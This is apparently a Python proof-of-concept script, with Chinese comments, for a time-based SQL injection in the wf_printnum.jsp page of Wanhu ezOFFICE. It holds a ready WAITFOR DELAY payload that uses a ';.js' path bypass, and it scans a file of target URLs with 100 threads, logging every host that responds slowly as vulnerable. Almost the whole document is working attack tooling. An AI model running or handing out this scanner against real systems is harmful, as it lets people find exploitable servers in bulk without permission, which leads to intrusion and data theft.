#万户ezOFFICE-wf_printnum.jsp存在SQL注入漏洞
import requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="万户ezOFFICE-wf_printnum.jsp存在SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
        
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print((f"Useag:\n\t python {sys.argv[0]} -h"))
def poc(target):
    payload = "/defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;.js?recordId=1;WAITFOR%20DELAY%20%270:0:5%27--"
    url = target+payload
    headers ={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36", "Accept": "application/signed-exchange;v=b3;q=0.7,*/*;q=0.8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "keep-alive"}
    proxies ={
         "http":"http://127.0.0.1:8080",
         "https":"http://127.0.0.1:8080"
    }
    try:
        res = requests.get(url=url,headers=headers,proxies=proxies,verify=False,timeout=10)
        if res.elapsed.total_seconds() >=5 :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"该url不存在漏洞{target}")
    except:
        print("该站点可能存在问题，请手动测试")

if __name__ == '__main__':
    main()